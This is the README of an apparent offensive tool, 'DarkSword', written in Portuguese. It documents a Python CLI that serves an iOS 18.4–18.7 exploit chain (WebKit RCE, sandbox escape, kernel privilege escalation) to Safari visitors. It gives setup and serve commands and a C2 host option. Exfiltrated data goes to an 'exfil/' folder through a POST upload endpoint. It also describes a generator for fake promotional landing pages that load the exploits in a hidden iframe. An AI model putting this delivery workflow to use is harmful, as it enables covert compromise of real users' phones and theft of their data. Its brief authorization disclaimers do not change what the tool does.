# DarkSword Red Team Framework

Framework Python com CLI para entrega da cadeia de exploits **DarkSword** em operações de red team. Baseado nos repositórios [DarkSword-RCE](https://github.com/htimesnine/DarkSword-RCE) e [darksword-kexploit](https://github.com/opa334/darksword-kexploit).

> **Aviso**: Use apenas em ambientes autorizados. Operações de red team requerem autorização formal.

## Referências

- [Google Threat Intelligence - DarkSword iOS Exploit Chain](https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain)
- Suporta iOS 18.4 - 18.7 (WebKit RCE + privilege escalation)

## Instalação

```bash
git clone https://github.com/bhideki/darksword.git
cd darksword
pip install -e .
```

## Uso Rápido

```bash
darksword serve
```

Acesse de um dispositivo iOS (Safari): `http://<SEU_IP>:8080/`

Payloads e kexploit ja incluidos. Para atualizar: `darksword sync` e `darksword sync-kexploit`

## Comandos CLI

| Comando | Descrição |
|---------|-----------|
| `darksword serve` | Inicia servidor HTTP para entrega dos exploits |
| `darksword sync` | Baixa payloads do repositório DarkSword-RCE |
| `darksword list` | Lista payloads disponíveis localmente |
| `darksword info` | Exibe informações sobre a cadeia e CVEs |
| `darksword template generate` | Gera landing page personalizada |
| `darksword template list` | Lista templates disponíveis |
| `darksword sync-kexploit` | Baixa kernel exploit (opa334, Objective-C) |

### Opções do `serve`

```
darksword serve -H 0.0.0.0 -p 8080
darksword serve -p 8443 --c2-host https://seu-c2.com/payload
```

- `-H, --host`: Host (padrão: 0.0.0.0)
- `-p, --port`: Porta (padrão: 8080)
- `--c2-host`: C2 customizado (ex: `http://seu-ip:8080`) - sobrescreve host/porta no pe_main.js
- `--redirect`: URL de redirecionamento em fallback

Sem `--c2-host`, o host/porta sao obtidos do Host header (mesmo servidor). Dados exfiltrados vao para `exfil/` e POST `/upload`.

### Gerar landing page customizada

```bash
darksword template generate --title "Promoção Especial" --redirect https://site-legitimo.com
```

## Estrutura do Projeto

```
DarkSword/
├── darksword/           # Modulo Python
│   ├── cli.py          # CLI principal
│   ├── server.py       # Servidor HTTP
│   ├── payloads.py     # Sync e gestao de payloads
│   └── config.py
├── payloads/            # Payloads Web (apos darksword sync)
├── templates/           # Templates de landing page
├── kexploit/            # Kernel exploit Obj-C (apos darksword sync-kexploit)
├── pyproject.toml
└── README.md
```

### Verificacao repos

| Repo | Arquivos |
|------|----------|
| **htimesnine/DarkSword-RCE** | index.html, frame.html, rce_loader.js, rce_module*.js, rce_worker*.js, sbx*.js, pe_main.js |
| **ghh-jb/DarkSword** | Identico (fallback) |
| **opa334/darksword-kexploit** | Makefile, src/main.m, entitlements.plist |
| **Nao publico** | rce_worker_18.7.js (iOS 18.7) |

## Fluxo da Cadeia DarkSword

1. **index.html** → Landing page carrega frame.html em iframe oculto
2. **frame.html** → Injeta rce_loader.js
3. **rce_loader.js** → Carrega módulos RCE conforme versão do iOS
4. **rce_module.js / rce_module_18.6.js** → Módulos RCE
5. **rce_worker_18.4.js / rce_worker_18.6.js** → Web Workers (exploits JSC)
6. **sbx0_main_18.4.js / sbx1_main.js** → Sandbox escape
7. **pe_main.js** → Privilege escalation

## Requisitos Éticos

- **Autorização**: Use apenas contra sistemas que você tem permissão explícita para testar
- **Escopo**: Respeite os limites definidos no contrato/escopo do engajamento
- **Documentação**: Registre todas as atividades para relatórios de red team

## Licença

MIT - Apenas para fins educacionais e de testes de segurança autorizados.
